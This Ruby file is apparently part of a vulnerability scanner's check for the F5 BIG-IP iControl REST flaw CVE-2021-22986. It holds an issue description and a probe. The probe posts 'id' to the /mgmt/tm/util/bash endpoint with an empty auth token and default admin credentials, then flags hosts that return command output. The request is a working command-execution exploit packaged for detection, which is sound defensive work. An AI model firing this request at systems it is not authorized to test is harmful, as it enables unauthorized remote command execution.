
module Intrigue

    module Issue
      class F5Cve202122986 < BaseIssue
        def self.generate(instance_details={})
        {
          added: "2021-03-22",
          name: "f5_cve_2021_22986",
          pretty_name: "F5 BIG-IP/BIG-IQ iControl REST API vulnerability CVE-2021-22986",
          severity: 1,
          category: "vulnerability",
          status: "confirmed",
          description: "This vulnerability allows for unauthenticated attackers with network access to the iControl REST interface, through the BIG-IP management interface and self IP addresses, to execute arbitrary system commands, create or delete files, and disable services. This vulnerability can only be exploited through the control plane and cannot be exploited through the data plane. Exploitation can lead to complete system compromise.",
          remediation: "Update to the latest version of the respective product.",
          affected_software: [ 
            { :vendor => "F5", :product => "BIG-IP Configuration Utility" },
            { :vendor => "F5", :product => "BIG-IP Access Policy Manager" },
            { :vendor => "F5", :product => "BIG-IP Application Security Manager" },
            { :vendor => "F5", :product => "BIG-IP Local Traffic Manager" }
          ],
          references: [
            { type: "description", uri: "https://support.f5.com/csp/article/K03009991" },
            { type: "description", uri: "https://cyber.gc.ca/en/alerts/vulnerabilities-impacting-f5-big-ip-and-big-iq" },
            { type: "exploit", uri: "https://research.nccgroup.com/2021/03/18/rift-detection-capabilities-for-recent-f5-big-ip-big-iq-icontrol-rest-api-vulnerabilities-cve-2021-22986/" },
          ],
          authors: ["h4x0r_dz", "shpendk"]
        }.merge!(instance_details)
        end
      end
    end
  
    module Task
      class F5Cve202122986 < BaseCheck 
      def self.check_metadata
        {
          allowed_types: ["Uri"],
          allowed_options: [
            {name: "basic_username", regex: "alpha_numeric_list", default: "admin" },
            {name: "basic_password", regex: "alpha_numeric_list", default: "admin" },
          ],
        }
      end
  
      # return truthy value to create an issue
      def check
        
        uri = "#{_get_entity_name}/mgmt/tm/util/bash"
        basic_username = _get_option("basic_username")
        basic_password = _get_option("basic_password")
        login = Base64.strict_encode64("#{basic_username}:#{basic_password}")

        headers = {
            "User-Agent" => "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0",
            "Content-Type" => "application/json",
            "X-F5-Auth-Token" => "",
            "Authorization" => "Basic #{login}"
        }
        data = {'command': 'run' , 'utilCmdArgs': '-c id'}

        res = http_post(uri, data, headers)
        if res.return_code == :ok
            if res.body_utf8.include? "commandResult"
                return true
            end
        end
      end
  
      end
    end
    
    end